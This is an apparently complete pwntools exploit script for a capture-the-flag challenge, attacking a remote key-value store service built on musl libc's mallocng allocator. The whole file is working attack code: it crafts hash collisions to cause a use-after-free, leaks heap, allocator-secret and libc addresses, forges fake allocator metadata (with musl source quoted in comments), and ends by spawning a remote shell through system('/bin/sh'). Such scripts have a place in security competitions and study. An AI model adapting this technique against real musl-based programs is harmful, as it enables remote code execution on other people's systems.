from pwn import *
import binascii

#p = process("./mos")
#p = process("./mos", aslr=False)
p = remote("mooosl.challenges.ooo", 23333)

go = lambda x: p.sendlineafter(":", str(x))
go2 = lambda x: p.sendafter(":", str(x))

def store(key, content):
    go(1)
    go(len(key))
    go2(key)
    go(len(content))
    go2(content)

def query(key):
    go(2)
    go(len(key))
    go2(key)

def delete(key):
    go(3)
    go(len(key))
    go2(key)

def twisted_store(key, content_len, content):
    go(1)
    go(len(key))
    go2(key)
    go(content_len)
    go2(content)

def twisted_query(key_len, key, content):
    go(2)
    go(key_len)
    go2(key)

def twisted_delete(key_len, key):
    go(3)
    go(key_len)
    go2(key)


def calc_hash(key):
    v4 = 2021
    for i in range(len(key)):
        v4 = 0x13377331 * v4 + ord(key[i])
    return v4 

def find_same_hash(key, length=-1):
    goal = calc_hash(key) & 0xfff
    if len == -1:
        yeah = "howdays"
    else :
        yeah = "A"*(length-3)
    string.printable = string.printable.replace("\n","")
    for one in string.printable:
        for two in string.printable:
            for three in string.printable:
                c = calc_hash(yeah+one+two+three)
                if c & 0xfff == goal:
                    return yeah+one+two+three
                    

#vic
store("d"*0x100, "1"*0x100)

delete("d"*0x100)
twisted_store("\x00", 0x13000, "a"*0x1000+"\n")
store(find_same_hash("\x00"), "2")

# #dum

# twisted_store(0x30, "how\n", "1"*0x30)

##raw_input()

#raw_input()
delete("\x00")


twisted_store("asdasd", 0x12000, "1asdasd\n")
twisted_store("asdasd", 0x12000, "1asdasd\n")

query("\x00")
p.recvuntil("bc0f000000000000")

heap = u64(binascii.unhexlify(p.recv(16)))


print(hex(heap))

fk  = p64(heap+0x300) + p64(heap&-4096)
fk += p64(1) + p64(0x210)
fk += p64(calc_hash("\x00")&0xffffffff) + p64(0)


store("5"*0x40,"6"*0x30)
store(fk,"6"*0x30)

query("\x00")

p.recvuntil("0x210:")
secret = u64(binascii.unhexlify(p.recv(16)))

print("secret: "+hex(secret))

mmaped = 0
z = 0
p.recv(1024)
mmaped = u64(binascii.unhexlify(p.recv(12))+"\x00\x00")

libc = mmaped + 0x13000 # same with server

print(hex(mmaped))
print(hex(libc))






delete(fk)
delete("asdasd")
delete("asdasd")

delete("5"*0x40)

delete("A"*0x30)

fake_heap_addr = mmaped+0x2080
meta_addr = mmaped+0x2010


'''
static inline struct meta *get_meta(const unsigned char *p)
{
	assert(!((uintptr_t)p & 15));
	int offset = *(const uint16_t *)(p - 2);
	int index = get_slot_index(p);
	if (p[-4]) {
		assert(!offset);
		offset = *(uint32_t *)(p - 8);
		assert(offset > 0xffff);
	}
	const struct group *base = (const void *)(p - UNIT*offset - UNIT);
	const struct meta *meta = base->meta;
	assert(meta->mem == base);
	assert(index <= meta->last_idx);
	assert(!(meta->avail_mask & (1u<<index)));
	assert(!(meta->freed_mask & (1u<<index)));
	const struct meta_area *area = (void *)((uintptr_t)meta & -4096);
	assert(area->check == ctx.secret);
	if (meta->sizeclass < 48) {
		assert(offset >= size_classes[meta->sizeclass]*index);
		assert(offset < size_classes[meta->sizeclass]*(index+1));
	} else {
		assert(meta->sizeclass == 63);
	}
	if (meta->maplen) {
		assert(offset <= meta->maplen*4096UL/UNIT - 1);
	}
	return (struct meta *)meta;
'''

'''
struct meta {
	struct meta *prev, *next;
	struct group *mem;
	volatile int avail_mask, freed_mask;
	uintptr_t last_idx:5;
	uintptr_t freeable:1;
	uintptr_t sizeclass:6;
	uintptr_t maplen:8*sizeof(uintptr_t)-12;
};

struct group {
	struct meta *meta;
	unsigned char active_idx:5;
	char pad[UNIT - sizeof(struct meta *) - 1];
	unsigned char storage[];
};
'''



area = p64(secret) + p64(0)#assert(area->check == ctx.secret);
#same addr meta, group
meta  = p64(fake_heap_addr+0x2000) + p64(libc+0x00000000000B43A8)
meta += p64(fake_heap_addr-0x10) + p64(0) #avil,freed_mask
meta += p64(0x1020) + p64(1) # freeable
meta += p64(0) + p64(0)#maplen

fake_heap  = p64(0)*4
fake_heap += p64(meta_addr) + p64(0)
fake_heap += "\x00"*0x2000
fake_heap += "/bin/sh;".ljust(0x28,"A")+"1"*16+"2"*8+"3"*8+p64(libc+0x50a90)

fk  = p64(fake_heap_addr) + p64(0)
fk += p64(1) + p64(0x100)
fk += p64(calc_hash("\x00")&0xffffffff) + p64(0)

print(hex(fake_heap_addr))

#0x78710
dummy = "A"*0x1fb0

full = area + meta + fake_heap

twisted_store(fk, 0x12000, dummy+full+"\n")

#raw_input()
delete("\x00")

p.interactive()
